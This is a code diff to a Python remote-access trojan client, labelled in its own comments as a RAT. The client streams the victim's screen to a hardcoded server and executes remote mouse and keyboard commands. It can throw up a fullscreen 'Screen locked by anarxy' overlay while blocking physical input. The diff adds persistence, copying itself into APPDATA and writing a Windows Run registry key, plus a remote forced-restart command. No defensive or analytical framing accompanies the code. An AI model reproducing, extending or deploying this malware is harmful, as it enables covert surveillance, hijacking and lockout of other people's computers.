@@ -12,10 +12,18 @@ import tkinter as tk
 from PIL import Image, ImageTk
 import platform
 import ctypes
+import subprocess
+import os
 import requests
 from io import BytesIO
 
-server_ip = '192.168.1.248'  # Replace with your server IP
+try:
+    import winreg
+except ImportError:
+    winreg = None  # Only works on Windows
+
+# === Setup ===
+server_ip = '192.168.1.248'
 server_port = 9999
 
 mouse = MouseController()
@@ -38,43 +46,49 @@ keymap = {
     "RIGHT": PynKey.right
 }
 
-# --- Side Button Support (Windows) ---
-if platform.system() == "Windows":
-    MOUSEEVENTF_XDOWN = 0x0080
-    MOUSEEVENTF_XUP = 0x0100
-    XBUTTON1 = 0x0001
-    XBUTTON2 = 0x0002
+# === Persistence Setup ===
+def add_to_startup():
+    if platform.system() == "Windows" and winreg:
+        try:
+            exe_path = os.path.abspath(__file__)
+            appdata = os.getenv("APPDATA")
+            install_dir = os.path.join(appdata, "AnarxyClient")
+            os.makedirs(install_dir, exist_ok=True)
+            target_path = os.path.join(install_dir, "client.exe")
 
-    def click_xbutton(xbutton):
-        ctypes.windll.user32.mouse_event(MOUSEEVENTF_XDOWN, 0, 0, xbutton, 0)
-        ctypes.windll.user32.mouse_event(MOUSEEVENTF_XUP, 0, 0, xbutton, 0)
+            if not os.path.exists(target_path):
+                # Copy to target location
+                import shutil
+                shutil.copy2(exe_path, target_path)
 
-# -------------------------------------------------------------------
-# LOCK SCREEN INFRASTRUCTURE (no global BlockInput, just local capture)
-# -------------------------------------------------------------------
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
+                                 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "AnarxyClient", 0, winreg.REG_SZ, target_path)
+            winreg.CloseKey(key)
+        except Exception as e:
+            print(f"[!] Startup reg error: {e}")
+
+# Run persistence on startup
+add_to_startup()
+
+# === Lock Screen Setup (same as before) ===
 lock_root = None
 lock_overlays = []
 lock_img_tk = None
 
 def init_lock_root():
-    """Create one hidden Tk root to manage overlay windows (non-blocking)."""
     global lock_root
     lock_root = tk.Tk()
-    lock_root.withdraw()  # hide main window
+    lock_root.withdraw()
     lock_root.mainloop()
 
-# Start a persistent hidden Tk root in the background
 threading.Thread(target=init_lock_root, daemon=True).start()
 
-def on_any_event(e):
-    """Consume any event inside the lock overlay, preventing interaction."""
-    return "break"  # Tells Tkinter to do nothing else with this event
+def on_any_event(e): return "break"
 
 def show_lock_screen_gui():
-    """Show a fullscreen overlay on each monitor with text & image, capturing all events."""
     global lock_overlays, lock_img_tk, lock_root
-
-    # Download the lock image (if not cached)
     if not lock_img_tk:
         try:
             res = requests.get("https://github.com/Anarxyfr/fdsa/blob/main/Anarxy.png?raw=true")
@@ -83,74 +97,47 @@ def show_lock_screen_gui():
         except:
             lock_img_tk = None
 
-    # Gather monitor info
     with mss.mss() as sct:
-        monitors = sct.monitors[1:]  # skip index 0 (the all-in-one monitor definition)
+        monitors = sct.monitors[1:]
 
-    # Create an overlay window per monitor
     for mon in monitors:
         win = tk.Toplevel(lock_root)
-        win.overrideredirect(True)  # no title bar or borders
+        win.overrideredirect(True)
         win.geometry(f"{mon['width']}x{mon['height']}+{mon['left']}+{mon['top']}")
         win.configure(bg="black")
         win.attributes("-topmost", True)
 
-        # Intercept all events to block them
         win.bind("<Key>", on_any_event)
-        win.bind("<Button-1>", on_any_event)
-        win.bind("<Button-2>", on_any_event)
-        win.bind("<Button-3>", on_any_event)
+        win.bind("<Button>", on_any_event)
         win.bind("<Motion>", on_any_event)
         win.bind("<MouseWheel>", on_any_event)
-        # XBUTTON / etc. might not be recognized by Tk, but at least we block normal input
 
         canvas = tk.Canvas(win, bg="black", highlightthickness=0)
         canvas.pack(fill="both", expand=True)
 
-        # Position the text near the top, so it doesn't overlap the image
-        text_y = int(mon["height"] * 0.25)  # 25% from top
-        canvas.create_text(mon["width"] // 2, text_y,
-                           text="Screen locked by anarxy",
-                           fill="white", font=("Arial", 48))
+        canvas.create_text(mon["width"] // 2, int(mon["height"] * 0.25),
+                           text="Screen locked by anarxy", fill="white", font=("Arial", 48))
 
-        # Position the image further down
-        img_y = int(mon["height"] * 0.5)  # 50% from top
         if lock_img_tk:
-            canvas.create_image(mon["width"] // 2, img_y, image=lock_img_tk)
-        else:
-            canvas.create_text(mon["width"] // 2, img_y,
-                               text="[Image not available]",
-                               fill="red", font=("Arial", 24))
+            canvas.create_image(mon["width"] // 2, int(mon["height"] * 0.5), image=lock_img_tk)
 
         lock_overlays.append(win)
 
-    # Block physical input (Windows only)
     if platform.system() == "Windows":
-        try:
-            ctypes.windll.user32.BlockInput(True)
-        except Exception as e:
-            print(f"[!] BlockInput failed (Admin required?): {e}")
+        try: ctypes.windll.user32.BlockInput(True)
+        except: pass
 
 def hide_lock_screen_gui():
-    """Destroy all overlay windows and allow normal VM input again."""
     global lock_overlays
     for w in lock_overlays:
-        try:
-            w.destroy()
-        except:
-            pass
+        try: w.destroy()
+        except: pass
     lock_overlays.clear()
-
-    # Unblock physical input (Windows only)
     if platform.system() == "Windows":
-        try:
-            ctypes.windll.user32.BlockInput(False)
-        except Exception as e:
-            print(f"[!] BlockInput failed (Admin required?): {e}")
+        try: ctypes.windll.user32.BlockInput(False)
+        except: pass
 
-# -------------------------------------------------------------------
-# MAIN RAT CLIENT
-# -------------------------------------------------------------------
+# === Main RAT Loop ===
 s = socket.socket()
 s.connect((server_ip, server_port))
 
@@ -160,16 +147,12 @@ with mss.mss() as sct:
     height = monitor["height"]
 
     while True:
-        # Capture screen
         frame_np = np.array(sct.grab(monitor))
         frame = cv2.cvtColor(frame_np, cv2.COLOR_BGRA2BGR)
-
-        # Encode as JPEG for low-latency
         _, encimg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
         data = pickle.dumps((encimg, width, height))
         s.sendall(struct.pack(">L", len(data)) + data)
 
-        # Check for incoming commands
         s.settimeout(0.01)
         try:
             raw = s.recv(4, socket.MSG_PEEK)
@@ -182,47 +165,33 @@ with mss.mss() as sct:
                 parts = cmd.split(":")
 
                 if parts[0] == "MOVE":
-                    x, y = int(parts[1]), int(parts[2])
-                    mouse.position = (x, y)
+                    mouse.position = (int(parts[1]), int(parts[2]))
 
                 elif parts[0] == "CLICK":
-                    if parts[1].upper() == "LEFT":
-                        mouse.click(Button.left)
-                    elif parts[1].upper() == "RIGHT":
-                        mouse.click(Button.right)
+                    mouse.click(Button.left if parts[1].upper() == "LEFT" else Button.right)
 
                 elif parts[0] == "SCROLL":
                     mouse.scroll(0, int(parts[1]))
 
                 elif parts[0] == "XBUTTON":
                     if platform.system() == "Windows":
-                        if parts[1] == "1":
-                            click_xbutton(XBUTTON1)
-                        elif parts[1] == "2":
-                            click_xbutton(XBUTTON2)
+                        xbtn = 0x0001 if parts[1] == "1" else 0x0002
+                        ctypes.windll.user32.mouse_event(0x0080, 0, 0, xbtn, 0)
+                        ctypes.windll.user32.mouse_event(0x0100, 0, 0, xbtn, 0)
 
                 elif parts[0] == "KEY":
-                    key = parts[1]
-                    try:
-                        if key.upper() in keymap:
-                            target_key = keymap[key.upper()]
-                        else:
-                            target_key = key.lower()
-                        keyboard.press(target_key)
-                        keyboard.release(target_key)
-                    except Exception as e:
-                        print(f"[!] Key error: {e}")
+                    key = keymap.get(parts[1].upper(), parts[1].lower())
+                    keyboard.press(key)
+                    keyboard.release(key)
 
-                elif parts[0] == "LOCKSCREEN":
-                    print("[*] Lock screen triggered.")
-                    if lock_root:
-                        # Use 'after(0, ...)' so it happens on the Tk thread
-                        lock_root.after(0, show_lock_screen_gui)
+                elif parts[0] == "LOCKSCREEN" and lock_root:
+                    lock_root.after(0, show_lock_screen_gui)
 
-                elif parts[0] == "UNLOCKSCREEN":
-                    print("[*] Unlock screen triggered.")
-                    if lock_root:
-                        lock_root.after(0, hide_lock_screen_gui)
+                elif parts[0] == "UNLOCKSCREEN" and lock_root:
+                    lock_root.after(0, hide_lock_screen_gui)
+
+                elif parts[0] == "RESTART":
+                    subprocess.call("shutdown /r /t 0", shell=True)
 
         except socket.timeout:
             continue
